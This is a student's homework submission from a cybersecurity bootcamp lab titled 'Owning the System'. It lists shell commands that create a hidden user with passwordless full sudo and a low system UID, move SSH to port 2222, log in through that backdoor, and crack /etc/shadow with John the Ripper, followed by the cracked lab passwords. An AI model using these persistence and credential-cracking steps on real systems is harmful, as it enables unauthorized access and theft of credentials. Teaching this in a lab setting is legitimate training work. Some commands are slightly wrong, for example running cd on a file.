## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    adduser --no-create-home sysd

2. Give your secret user a password: 
    passwd sysd 
    [entered password]
    is the command that allows you to change the password
    Adduser allows the admin to set a password at the time of creation. 
    

3. Give your secret user a system UID < 1000:
    usermod -u 777 sysd

4. Give your secret user the same GID:
    groupmod -g 777 sysd 

5. Give your secret user full `sudo` access without the need for a password:
   visudo
   #Added sysd ALL=(ALL:ALL) NOPASSWD:ALL at the end of the sudoers file

6. Test that `sudo` access works without your password:
    sudo visudo
    sudo apt-get update
    sudo -l 

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:
 cd /etc/ssh/sshd_config
 nano sshd_config
 #changed #Port22 to Port 2222

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
   #I ran the following commands to ensure the SSH service was restarted 
   sudo service sshd restart
   sudo systemctl restart ssh

2. Exit the `root` account:
    #i just typed exit a bunch of times in the command line until i got back to sysadmin@UbuntuDesktop in green

3. SSH to the target machine using your `sysd` account and port `2222`:
    ssh sysd@192.168.6.105 -p 2222`

4. Use `sudo` to switch to the root user:
    sudo -s 

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
    cd /etc
    sudo john shadow
    stallman:computer
    babbage:freedom
    mitnik:trustno1
    lovelace:dragon
    turing:lakers
    sysadmin:passw0rd
    student:Goodluck!
    

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

